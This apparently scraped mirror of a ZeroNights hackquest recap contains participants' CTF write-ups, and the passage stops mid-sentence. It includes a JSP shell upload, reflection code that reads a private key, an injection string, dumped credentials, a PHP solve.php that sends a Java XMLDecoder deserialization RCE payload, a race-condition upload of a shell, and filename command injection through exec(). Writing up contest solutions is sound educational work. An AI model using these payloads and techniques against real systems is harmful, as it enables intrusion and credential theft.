<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ZeroNights - about the past hackquest and the upcoming Hardware Village</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hello! 
 Before the ZeroNights conference, about which we have already written many times on Habr√©, there are only a few days left! 

 One of our last...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>ZeroNights - about the past hackquest and the upcoming Hardware Village</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/6b7/1d3/db8/6b71d3db8a086658cd9d64609f444de6.jpg" alt="image"><br><br><h1>  Hello! </h1><br>  Before the ZeroNights conference, about which we have already written many times on Habr√©, there are only a few days left! <br><br>  One of our last posts was a story about <a href="http://habrahabr.ru/company/dsec/blog/270393/">HackQuest</a> .  He successfully passed and it was time for the tasks and how they were solved.  And of course - to congratulate the winners! 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <ul><li>  1 day, task ‚ÄúChocolate Factory‚Äù (web) - cdump and BlackFan </li><li>  Day 2, the task ‚ÄúHSM V1.0‚Äù (web, crypto, hash cracking) - Abr1k0s </li><li>  Day 3, the task ‚ÄúBAZAAR NG‚Äù (web) - AV1ct0r </li><li>  Day 4, the task ‚ÄúILLOGICAL PHOTOGALLERY‚Äù (web, oauth) - Beched </li><li>  5 day, task ‚ÄúCRACKME‚Äù (reverse) - sysenter </li><li>  Day 6, the task ‚ÄúBANK ROBBERY‚Äù, (phreaking, web) - dr.glukyne </li><li>  7 day, task ‚ÄúBLINK2PWN‚Äù, (reverse, binary pwn) - mr_dawerty </li></ul><br><a name="habracut"></a><br><h2>  Day 1 - Chocolate Factory </h2><br>  The task initially provided quite specific conditions - the execution of JSP code (it was planned that with restrictions), so it was not without complications.  When starting the task, the Tomkat did not reset the cache (after updating one of the classes from the application) and the task was resolved through RCE :-) We left it as an expected decision, since it took enough time and created a competition between the participants <br><br>  Cdump solution <br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><blockquote>  When creating an order, you can intercept the form submission in Burp and change the orderName field to anything.jsp, and in the order field enter the text of any jsp-shell. <br>  After loading, open the shell (link "You can check your order here") and download the tomcat'ov directory of webapps, in it we find jsp files and compiled classes, decompiling one of them using the jad utility (WEB-INF / classes / ZN_Chocolate / CRYPTO /SecretGrandParentForBigBossesNeeds.class) see the key we need: private String TrueSecretChocolateKey () {return "ZNV: iMp0518UrU_53cR3T_k3y_50d11dcb46506e93917f82c0e828b1a9";  } </blockquote><br></div></div><br><br>  After the task was restarted and now the expected decision (vraytap from second place - Beched) <br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><blockquote>  <i>Input</i> <br><br>  Site with file upload functionality. <br>  Jsp-shell in XML format, bypassing white-list.  After that all participants were given the source code. <br>  Task again could be solved in a "cheating" way, by reading the source code. <br><br>  <i>Output</i> <br><br>  Open the classes in JD-GUI: <a href="">screenshot</a> . <br><br>  We can see the code of the JSP checker, which parses page imports.  There're a lot of ways to check this flag, but not the flag.  Initially the flag of SecretGrandParentForBigBossesNeeds.class: <br><pre><code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">SecretGrandParentForBigBossesNeeds</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">TrueSecretChocolateKey</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"ZNV:3X@mPl3_k3y_a0a81ab87f74d307b8e51fd85048e714"</span></span>; }</code> </pre> <br>  You can see your reflection.  If we are trying to import SecretGrandParentForBigBossesNeeds, we‚Äôll fail, let's try to import Secret. <br><pre> <code class="java hljs">&lt;%@ page <span class="hljs-keyword"><span class="hljs-keyword">import</span></span>=<span class="hljs-string"><span class="hljs-string">"java.lang.reflect.*,ZN_Chocolate.CRYPTO.Secret"</span></span> %&gt; &lt;% Secret s = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Secret(); out.println(s.TrueSecretChocolateKey()); %&gt;</code> </pre><br><br>  Hm, error 500 ... we can read that "method TrueSecretChocolateKey of SadBigBoss is not visible". <br>  Aha!  After fixing the source code.  But anyway, method is not visible, it's private.  Let's use reflection to make it accessible: <br><br><pre> <code class="java hljs">&lt;%@ page <span class="hljs-keyword"><span class="hljs-keyword">import</span></span>=<span class="hljs-string"><span class="hljs-string">"java.lang.reflect.*,ZN_Chocolate.CRYPTO.Secret"</span></span> %&gt; &lt;% SadBigBoss s = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SadBigBoss(); Method method = s.getClass().getDeclaredMethod(<span class="hljs-string"><span class="hljs-string">"TrueSecretChocolateKey"</span></span>); method.setAccessible(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); out.println(method.invoke(s)); %&gt;</code> </pre><br><br>  That's it flag is on the page =) </blockquote><br></div></div><br><br><h2>  Day 2 - HSM V1.0 </h2><br>  The task was atypical for our hack quest - it was necessary to make hashes that were completely different, look for implementations of unpopular algorithms and optimize them. <br><br>  Vraytap from Abr1k0s <br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text">  1. Downloaded a dump <br>  2. Using the login as a password, I found a user through whom it was possible to easily log in to the system. <br>  3. I went into private messages, I realized that I can read other people's messages.  After reading, I saw that a message was sent to the administrators about the need for an urgent password change and instructions on how to generate a new password based on the old one. <br>  Hello!  User dump was compromised.  All administrators should change their passwords !!!  Right now! <br>  Because you need to use supergenpass.  It is rather simple.  Get enter your password <br>  4. Found a subdomain dev.  Picked up the password for basic authorization. <br>  5. I downloaded a part of the source code and a password-protected archive, got the password from the archive, where the detailed password hashing scheme was found. <br>  6. Wrote a script that implements the hashing function described in the archive instructions.  All used algorithms could be found on the links listed in the pdf with the instruction. <br>  7. I went to azure and using a test account I rented a 16th nuclear server, where I started brute force hashes.  This gave an advantage over those who engaged in brute force with home computers and laptops. <br>  8. From the first letters of the selected passwords (and based on the message received in paragraph 3) I realized that for the bruteforce of the admin accounts it is necessary to supplement the bruteforce algorithm with a function, adding supergenpass <br>  9. In the end, the first letters of the passwords received included the phrase: theflagis287a2ef40fe140fd1acf8ec695ba1e53replacesgppasswithmasterpassandyougettrueflag. <br>  Flag: 287a2ef40fe140fd1acf8ec695ba1e53 <br></div></div><br><h2>  Day 3 - BAZAAR NG </h2><br>  It was a task sprint, representing the "Internet market" (hence the name).  It used a variety of Java things: jsp and servlets, Hibernate, API on Restlet. <br>  The task consisted of three main vulnerabilities that had to be exploited sequentially: execution after redirect, HQL injection (analog to SQL injection, only for Hibernate) and RCE via XML serialization in Restlet. <br>  But it also left a lot of small vulnerabilities (the possibility of taking out accounts, XSS, etc.), which allowed ‚Äúattacking‚Äù other participants (or even the admin) and bypassing some parts of the task. <br><br>  Very briefly and in the case of AV1ct0r: <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><blockquote>  1. Found admin.jsp, search.jsp, index.jsp, admin_login.jsp, adminochka.jsp, adminochka.jsp.bak <br>  2. I screwed up the test / test (apparently someone added) <br><br>  3. Injection <br>  potato 'AND' 1 \ '' = 1 union select 1, (select user ()), 3 - '=' 1% <br><br><br>  host: zn-java <br>  version: 5.5.46-0ubuntu0.14.04.2 <br>  user: webappuser @ localhost <br><br><pre> <code class="hljs smalltalk">wepapp.developers --------------------------------------- | id | username | password | --------------------------------------- | <span class="hljs-number"><span class="hljs-number">0</span></span> | developer_Vasia | fpBA7BPlS8wJ | | <span class="hljs-number"><span class="hljs-number">1</span></span> | developer_Jorik | <span class="hljs-number"><span class="hljs-number">5</span></span>FftW6Aua2ef | --------------------------------------- wepapp.goods ------------------------- | id | name | price | ------------------------- | <span class="hljs-number"><span class="hljs-number">0</span></span> | potato | <span class="hljs-number"><span class="hljs-number">40</span></span> | | <span class="hljs-number"><span class="hljs-number">1</span></span> | apple | <span class="hljs-number"><span class="hljs-number">100</span></span> | | <span class="hljs-number"><span class="hljs-number">2</span></span> | carrot | <span class="hljs-number"><span class="hljs-number">25</span></span> | | <span class="hljs-number"><span class="hljs-number">3</span></span> | tomato | <span class="hljs-number"><span class="hljs-number">120</span></span> | | <span class="hljs-number"><span class="hljs-number">4</span></span> | pear | <span class="hljs-number"><span class="hljs-number">70</span></span> | | <span class="hljs-number"><span class="hljs-number">5</span></span> | tomato | <span class="hljs-number"><span class="hljs-number">110</span></span> | | <span class="hljs-number"><span class="hljs-number">12</span></span> | pear | <span class="hljs-number"><span class="hljs-number">80</span></span> | | <span class="hljs-number"><span class="hljs-number">13</span></span> | cucumber | <span class="hljs-number"><span class="hljs-number">80</span></span> | ------------------------- wepapp.users ---------------------------- | id | username | password | ----------------------------</code> </pre><br>  ... <br><br>  4. Compiled the client and recorded its traffic. <br>  5. RCE through xml deserialization (solve.php) <br><br>  <b>solve.php</b> <br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $x =&lt;&lt;&lt;HTML <span class="hljs-meta"><span class="hljs-meta">&lt;?</span></span>xml version=<span class="hljs-string"><span class="hljs-string">"1.0"</span></span> encoding=<span class="hljs-string"><span class="hljs-string">"UTF-8"</span></span><span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span> &lt;java version=<span class="hljs-string"><span class="hljs-string">"1.8.0_05"</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">java</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">beans</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">XMLDecoder</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">id</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">_response</span></span></span><span class="hljs-class">" </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">class</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">java</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">lang</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">String</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">string</span></span></span><span class="hljs-class">&gt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Mode</span></span></span><span class="hljs-class"> 1 </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">to</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">get</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">a</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">value</span></span></span><span class="hljs-class">&lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">string</span></span></span><span class="hljs-class">&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class">&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">id</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">runtime</span></span></span><span class="hljs-class">" </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">class</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">java</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">lang</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Runtime</span></span></span><span class="hljs-class">" </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">method</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">getRuntime</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">void</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">id</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">process</span></span></span><span class="hljs-class">" </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">method</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">exec</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">string</span></span></span><span class="hljs-class">&gt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">cat</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">webapps</span></span></span><span class="hljs-class">/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">flag</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">txt</span></span></span><span class="hljs-class">&lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">string</span></span></span><span class="hljs-class">&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">void</span></span></span><span class="hljs-class">&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class">&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">idref</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">process</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">void</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">id</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">inputStream</span></span></span><span class="hljs-class">" </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">method</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">getInputStream</span></span></span><span class="hljs-class">"/&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class">&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">id</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">inputStreamReader</span></span></span><span class="hljs-class">" </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">class</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">java</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">io</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">InputStreamReader</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">idref</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">inputStream</span></span></span><span class="hljs-class">"/&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class">&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">id</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">bufferedReader</span></span></span><span class="hljs-class">" </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">class</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">java</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">io</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">BufferedReader</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">idref</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">inputStreamReader</span></span></span><span class="hljs-class">"/&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class">&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">idref</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">bufferedReader</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">void</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">id</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">line1</span></span></span><span class="hljs-class">" </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">method</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">readLine</span></span></span><span class="hljs-class">"/&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class">&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">idref</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">bufferedReader</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">void</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">id</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">line2</span></span></span><span class="hljs-class">" </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">method</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">readLine</span></span></span><span class="hljs-class">"/&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class">&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">string</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">id</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">response</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">idref</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">line1</span></span></span><span class="hljs-class">"/&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">idref</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">line2</span></span></span><span class="hljs-class">"/&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">string</span></span></span><span class="hljs-class">&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">class</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">org</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">restlet</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Response</span></span></span><span class="hljs-class">" </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">method</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">getCurrent</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">void</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">method</span></span></span><span class="hljs-class"> ="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">setEntity</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">idref</span></span></span><span class="hljs-class"> = "</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">response</span></span></span><span class="hljs-class">"/&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">class</span></span></span><span class="hljs-class"> = "</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">org</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">restlet</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">data</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MediaType</span></span></span><span class="hljs-class">" </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">field</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">TEXT_HTML</span></span></span><span class="hljs-class">"&gt;&lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class">&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">void</span></span></span><span class="hljs-class">&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">object</span></span></span><span class="hljs-class">&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">java</span></span></span><span class="hljs-class">&gt; </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">HTML</span></span></span><span class="hljs-class">; </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">do</span></span></span><span class="hljs-class"> </span></span>{ $socket = fsockopen(<span class="hljs-string"><span class="hljs-string">"107.170.122.167"</span></span>, <span class="hljs-number"><span class="hljs-number">80</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (!$socket); $packet = <span class="hljs-string"><span class="hljs-string">"POST /ZN_HQ/API/prods HTTP/1.0\r\n"</span></span>; $packet.= <span class="hljs-string"><span class="hljs-string">"Content-Type: application/x-java-serialized-object+xml\r\n"</span></span>; $packet.= <span class="hljs-string"><span class="hljs-string">"Host: 107.170.122.167\n"</span></span>; $packet.= <span class="hljs-string"><span class="hljs-string">"Connection: Close\r\n"</span></span>; $packet.= <span class="hljs-string"><span class="hljs-string">"Content-Length: "</span></span>.strlen($x).<span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; $packet.= <span class="hljs-string"><span class="hljs-string">"Authorization: Basic ZGV2ZWxvcGVyX1Zhc2lhOmZwQkE3QlBsUzh3Sg==\r\n"</span></span>; $packet.= <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; $packet.= $x; fwrite($socket, $packet); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(!@feof($socket)) <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> fread($socket, <span class="hljs-number"><span class="hljs-number">4096</span></span>); fclose($socket); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre></div></div><br><br></blockquote><br></div></div><br><br><h2>  Day 4 - ILLOGICAL PHOTOGALLERY </h2><br>  The bugs in the implementation of OAuth (vk), CSRF, zip path traversal and other things needed to be found and managed to be exploited by the participants (few managed). <br><br>  Vrytap from Beched <br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><blockquote>  <i>Input</i> <br><br>  Site (0x3d.ru) with OAuth (vk.com) functionality. <br>  During recon one can find content.0x3d.ru and dev.0x3d.ru (127.0.0.1) subdomains. <br><br>  <i>Output</i> <br><br>  There were a lot of unintended bugs, including XSS, SQL injection, RCE, etc ... <br><br>  1. Authentication bypass (unintended) <br>  If you‚Äôre logging in to your private tab.  You are currently logged in as a privileged user, which can upload files. <br><br>  2. Authentication bypass <br>  If you‚Äôre logging on to the web page, you‚Äôve got to know how to download it: &lt;/ b&gt; (&lt;img src = ...): the first triggers logout CSRF (like / logout), the second is you auth token link.  He will be able to follow your profile.  Now you can login as a privileged user. <br><br>  3. Race condition (unintended) <br>  Privileged user can upload avatar.  "* .php" is disallowed, but ".jpg.php" is ok =) Where's the shell?  Hm, avatars are uploaded to content.0x3d.ru/avatars, but they are converted into $ hash.jpg.  The file is first uploaded and converted afterwards. <br>  Take BurpSuite, launch 100 threads (GET / avatars/beched.jpg.php, Host: content.0x3d.ru) and upload beched.jpg.php.  Wow, 200!  Shit, plain-text ... They disabled PHP in this dir, but anyway, this is a dangerous bug. <br><br>  4. SQL injection (unintended) <br>  It was a multi-INSERT and guessing fields.  There was no link for the auth bypass.  I found a working copy of the task on that server =) <br><br>  5. Code execution (unintended) <br>  So, we've got an author's testing server.  Let's log in and check SQL injection there.  Wow, there's file_priv = Y!  Read the source code, read configs, no flag = ( <br>  But there's something else in ZIP upload functionality: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span>(preg_match(<span class="hljs-string"><span class="hljs-string">'/[.](ZIP)|(zip)|(RAR)|(rar)$/'</span></span>,$_FILES[<span class="hljs-string"><span class="hljs-string">'fupload'</span></span>][<span class="hljs-string"><span class="hljs-string">'name'</span></span>])) { $avatar = <span class="hljs-string"><span class="hljs-string">'avatars/net-avatara.jpg'</span></span>; $filename = $_FILES[<span class="hljs-string"><span class="hljs-string">'fupload'</span></span>][<span class="hljs-string"><span class="hljs-string">'name'</span></span>]; $source = $_FILES[<span class="hljs-string"><span class="hljs-string">'fupload'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>]; $target = $path_to_90_directory . $filename; move_uploaded_file($source, $target);<span class="hljs-comment"><span class="hljs-comment">//    $path_to_90_directory $command = 'python /var/www/0x3d.ru/zn1/avatars/unzip.py /var/www/0x3d.ru/zn1/avatars/'.$filename; $temp = exec($command, $output); }</span></span></code> </pre><br><br>  So, we can execute code in the filename.  But no flag on this test server%) <br><br>  6. Code execution <br>  Now let's do what they want.  Let's upload the shell into the docroot of content.0x3d.ru.  We'll do it 